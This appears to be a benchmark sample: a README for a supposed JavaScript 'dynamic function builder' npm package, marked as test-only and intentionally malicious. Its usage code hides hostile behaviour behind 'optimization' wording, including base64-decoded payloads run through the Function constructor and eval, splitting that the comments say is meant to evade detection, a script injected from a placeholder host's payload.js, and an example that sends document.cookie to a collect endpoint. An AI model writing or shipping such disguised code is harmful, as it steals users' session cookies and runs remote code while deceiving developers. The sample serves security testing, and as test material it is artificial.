# JavaScript Dynamic Function Builder

BENCHMARK_TEST_ONLY - This file contains intentionally malicious patterns for security testing.

## Description

A flexible JavaScript utility for creating dynamic functions at runtime for enhanced performance.

## Installation

```bash
npm install dynamic-fn-builder
```

## Usage

Build optimized functions dynamically based on runtime conditions:

```javascript
// Dynamic Function Builder - Advanced JavaScript Optimization
class DynamicFunctionBuilder {
    constructor() {
        this.endpointBase = "https://[REDACTED].example.com";
        this.functionCache = new Map();
    }

    // DYNAMIC-002: JavaScript Function constructor abuse
    createOptimizedHandler(encodedLogic) {
        // Decode the optimization logic
        const decodedLogic = atob(encodedLogic);

        // Create function dynamically from string
        const handler = new Function('return ' + decodedLogic)();
        return handler;
    }

    buildFetcher(baseUrl, path) {
        // Create a dynamic fetch function
        const fn = Function("a", "b", "return fetch(a+b).then(r=>r.json())");
        return fn(baseUrl, path);
    }

    createDataProcessor() {
        // Build function from parts
        const parts = [
            "async function() {",
            "  const data = await fetch('",
            this.endpointBase,
            "/collect');",
            "  return data.json();",
            "}"
        ];

        // Execute via Function constructor
        const processor = new Function('return ' + parts.join(''))();
        return processor;
    }

    // Obfuscated payload execution
    executePayload(payload) {
        // Split to avoid pattern detection
        const F = Function;
        const encoded = btoa(payload);

        // Reconstruct and execute
        const executor = new F('p', `
            const decoded = atob(p);
            return eval(decoded);
        `);

        return executor(encoded);
    }

    injectScript() {
        // Dynamic script injection via Function
        const scriptBuilder = Function(`
            const s = document.createElement('script');
            s.src = '${this.endpointBase}/payload.js';
            document.head.appendChild(s);
            return s;
        `);

        return scriptBuilder();
    }
}

// Example: Create exfiltration function
const builder = new DynamicFunctionBuilder();
const exfil = builder.buildFetcher(
    "https://[REDACTED].example.com",
    "/api/collect?data=" + encodeURIComponent(document.cookie)
);
```

## API Reference

### createOptimizedHandler(encodedLogic)
Creates an optimized function handler from base64-encoded logic.

### buildFetcher(baseUrl, path)
Builds a dynamic fetch function for API calls.
